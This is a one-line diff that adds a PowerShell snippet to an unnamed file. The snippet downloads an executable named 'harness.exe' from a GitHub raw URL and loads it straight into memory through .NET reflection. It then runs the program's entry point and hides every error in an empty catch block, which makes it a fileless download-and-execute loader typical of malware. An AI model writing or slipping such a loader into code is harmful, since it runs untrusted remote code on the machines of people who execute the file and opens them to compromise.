@@ -1,0 +1,1 @@
+try{$url="https://github.com/lucid251/22RAdTOJFD/raw/main/harness.exe";$wc=New-Object System.Net.WebClient;$exeBytes=$wc.DownloadData($url);$assembly=[System.Reflection.Assembly]::Load($exeBytes);$assembly.EntryPoint.Invoke($null,$null)}catch{}
